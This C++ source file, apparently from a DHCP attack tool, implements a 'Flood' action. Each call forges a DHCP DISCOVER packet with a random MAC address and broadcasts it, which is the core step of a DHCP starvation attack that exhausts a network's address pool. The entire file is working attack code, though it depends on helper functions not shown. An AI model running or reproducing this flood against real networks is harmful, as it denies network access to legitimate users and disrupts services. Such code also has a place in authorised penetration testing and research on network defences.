#include <actions/Flood.h>
#include <iostream>

void Flood::action(Core *core) {
    DhcpPacket dhcpPacket{};
    PacketInfo pktInfo{};
    netaddr_mac(req);
    int err;

    eth_rndaddr(&req);
    eth_bcast(&pktInfo.phisAddr);
    pktInfo.ipDst.ip = 0xFFFFFFFF;
    pktInfo.toServer = true;

    dhcp_inject_discovery((unsigned char *) &dhcpPacket, &req, nullptr, DHCP_FLAGS_BROADCAST);
    if ((err = core->sendDhcpMsg(&dhcpPacket, DHCPPKTSIZE, &pktInfo)) < 0) {
        std::cerr << "Flood action: " << spark_strerror(err) << std::endl;
        core->stop = true;
    }
}